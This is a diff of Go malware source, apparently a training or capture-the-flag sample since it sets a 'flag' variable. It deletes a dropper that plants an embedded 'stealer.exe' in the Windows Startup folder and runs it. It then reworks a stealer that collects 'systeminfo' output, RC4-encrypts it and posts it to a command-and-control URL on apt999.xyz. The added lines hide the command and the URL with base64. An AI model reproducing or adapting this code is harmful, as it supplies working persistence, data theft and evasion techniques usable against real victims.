@@ -1,68 +1,9 @@
-//go build -ldflags "-H=windowsgui"
-package main
-
-import (
-	"embed"
-	"os"
-	"os/exec"
-	"path/filepath"
-	"time"
-)
-
-//go:embed stealer.exe
-var embeddedFiles embed.FS
-
-func check() {
-	// check installed execl2016
-	excel_path := `C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE`
-	if _, err := os.Stat(excel_path); os.IsNotExist(err) {
-		os.Exit(1)
-	}
-}
-
-func hidden() []byte {
-	// embed stealer.exe into dropper.exe
-	data, err := embeddedFiles.ReadFile("stealer.exe")
-	if err != nil {
-		return nil
-	}
-	return data
-}
-
-func drop(data []byte) string {
-	// output stealer.exe to startup folder
-	appdata := os.Getenv("APPDATA")
-	startup := filepath.Join(appdata, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\stealer.exe")
-
-	err := os.WriteFile(startup, data, 0755)
-	if err != nil {
-		return ""
-	}
-	return startup
-}
-
-func main() {
-	check()
-
-	data := hidden()
-
-	path := drop(data)
-
-	// exec stealer.exe
-	time.Sleep(5 * time.Second)
-	cmd := exec.Command(path)
-	cmd.Start()
-}
-
-
-
-
-
 package main
 
 import (
 	"crypto/rc4"
 	"encoding/base64"
+	"fmt"
 	"io"
 	"net/http"
 	"net/url"
@@ -74,11 +15,15 @@ var flag string
 
 func encrypt() string {
 	// exec systeminfo
-	out, err := exec.Command("systeminfo").Output()
+	encoded_command := "c3lzdGVtaW5mbw=="
+	decoded_command, err := base64.StdEncoding.DecodeString(encoded_command)
 	if err != nil {
 		return ""
 	}
-	result := out
+	result, err := exec.Command(string(decoded_command)).Output()
+	if err != nil {
+		return ""
+	}
 
 	// decode key
 	encoded_key := "k0XIjRJZDWQfXSGWesL4vQ=="
@@ -86,43 +31,48 @@ func encrypt() string {
 	if err != nil {
 		return ""
 	}
-	// decrypt key
-	rc4_key := []byte("rc4_key_is_tokyo")
-	cipher1, err := rc4.NewCipher(rc4_key)
+	// decrypt key with dummy_key
+	dummy_key := []byte("rc4_key_is_tokyo")
+	dummy_cipher, err := rc4.NewCipher(dummy_key)
 	if err != nil {
 		return ""
 	}
-	key := make([]byte, len(decoded_key))
-	cipher1.XORKeyStream(key, decoded_key)
+	decrypted_key := make([]byte, len(decoded_key))
+	dummy_cipher.XORKeyStream(decrypted_key, decoded_key)
 
-	// encrypt result with decrypted key
-	cipher2, err := rc4.NewCipher(key)
+	// encrypt result with decrypted_key
+	result_cipher, err := rc4.NewCipher(decrypted_key)
 	if err != nil {
 		return ""
 	}
-	ciphertext := make([]byte, len(result))
-	cipher2.XORKeyStream(ciphertext, result)
+	encrypted_result := make([]byte, len(result))
+	result_cipher.XORKeyStream(encrypted_result, result)
 
 	// encode encrypted result
-	encoded := base64.StdEncoding.EncodeToString(ciphertext)
+	encoded_result := base64.StdEncoding.EncodeToString(encrypted_result)
 
 	// for flag
-	flag = (string(key))
+	flag = (string(decrypted_key))
 
-	return encoded
+	return encoded_result
 }
 
 func httprequest(data string) {
 	// set http request
 	form := url.Values{}
 	form.Add("TEST", data)
-	url := "http://apt999.xyz/c2.php"
+	encoded_url := "aHR0cDovL2FwdDk5OS54eXovYzIucGhw"
+	decoded_url, err := base64.StdEncoding.DecodeString(encoded_url)
+	if err != nil {
+		return
+	}
 	client := &http.Client{
 		Timeout: 1 * time.Second,
 	}
+	fmt.Println(string(decoded_url))
 
 	// send http request
-	resp, err := client.PostForm(url, form)
+	resp, err := client.PostForm(string(decoded_url), form)
 	if err != nil {
 		return
 	}
